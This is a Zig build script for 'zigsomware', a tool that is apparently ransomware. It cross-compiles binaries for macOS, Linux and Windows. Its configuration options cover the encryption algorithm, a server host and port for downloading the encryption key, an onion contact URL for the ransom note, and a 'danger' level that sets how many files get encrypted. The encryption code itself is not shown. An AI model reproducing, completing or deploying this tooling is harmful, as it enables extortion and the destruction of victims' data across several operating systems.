const std = @import("std");

const APP_NAME: []const u8 = "zigsomware";

const targets: []const std.Target.Query = &.{
    // .{ .cpu_arch = .aarch64, .os_tag = .macos },
    .{ .cpu_arch = .x86_64, .os_tag = .macos },
    .{ .cpu_arch = .x86_64, .os_tag = .linux },
    .{ .cpu_arch = .x86_64, .os_tag = .windows },
};

// See Algorithm in './src/alg.zig'
const supported_algorithms: []const []const u8 = &.{
    "xchacha20-poly1305",
};

fn isSupportedAlgorithm(alg: []const u8) bool {
    for (supported_algorithms) |supported_alg| {
        if (std.mem.eql(u8, supported_alg, alg)) {
            return true;
        }
    }
    return false;
}

const supported_level: []const []const u8 = &.{
    "safe",
    "normal",
    "danger",
};

pub fn build(b: *std.Build) !void {
    // const optimize = b.standardOptimizeOption(.{});
    const optimize = .ReleaseSafe;

    // Build options (-Dlhost, -Dlport)
    const opt_alg = b.option(
        []const u8,
        "ALG",
        "Algorithm for encryption/decryption",
    ) orelse "xchacha20-poly1305";
    const opt_server_host = b.option(
        []const u8,
        "SERVER_HOST",
        "Server address",
    ) orelse "127.0.0.1";
    const opt_server_port = b.option(
        u16,
        "SERVER_PORT",
        "Server port",
    ) orelse 4444;
    const opt_server_path = b.option(
        []const u8,
        "SERVER_PATH",
        "The URL path of the server to download the encryption key",
    ) orelse "/";
    const opt_contact_url = b.option(
        []const u8,
        "CONTACT_URL",
        "Your website URL such as Onion URL, that will be written in the ransom note",
    ) orelse "http://xxxxxxxxxxxxxxxxxxxxxxxxx.onion";
    const opt_level = b.option(
        usize,
        "LEVEL",
        "The level at which Zigsomware encrypts files. The higher the level, the more files will be encrypted. [1: safe, 2: normal, 3: danger] (default: 1)",
    ) orelse 1;

    // Validate options
    if (!isSupportedAlgorithm(opt_alg)) {
        std.log.err("The ALG is invalid. Choose one of the following:\n", .{});
        for (supported_algorithms) |supported_alg| {
            std.debug.print("{s}, ", .{supported_alg});
        }
        std.debug.print("\n\n", .{});
        return error.UnsupportedAlgorithm;
    }
    if (!std.mem.startsWith(u8, opt_server_path, "/")) {
        std.log.err("The SERVER_PATH must be started with '/'.\n", .{});
        return error.InvalidServerPath;
    }
    if (opt_level < 1 or 3 < opt_level) {
        std.log.err("The LEVEL must be between 1 and 3.\n", .{});
        return error.InvalidLevel;
    }

    const opts = b.addOptions();
    opts.addOption([]const u8, "alg", opt_alg);
    opts.addOption([]const u8, "server_host", opt_server_host);
    opts.addOption(u16, "server_port", opt_server_port);
    opts.addOption([]const u8, "server_path", opt_server_path);
    opts.addOption([]const u8, "contact_url", opt_contact_url);
    opts.addOption(usize, "level", opt_level);

    for (targets) |t| {
        const exe = b.addExecutable(.{
            .name = APP_NAME,
            .root_source_file = b.path("src/main.zig"),
            .target = b.resolveTargetQuery(t),
            .optimize = optimize,
            .link_libc = true,
        });
        exe.root_module.addImport("clap", b.dependency("clap", .{}).module("clap"));
        // Embed build options
        exe.root_module.addOptions("build_options", opts);

        const target_output_exe = b.addInstallArtifact(
            exe,
            .{
                .dest_dir = .{
                    .override = .{
                        .custom = try t.zigTriple(b.allocator),
                    },
                },
            },
        );
        b.getInstallStep().dependOn(&target_output_exe.step);
    }
}
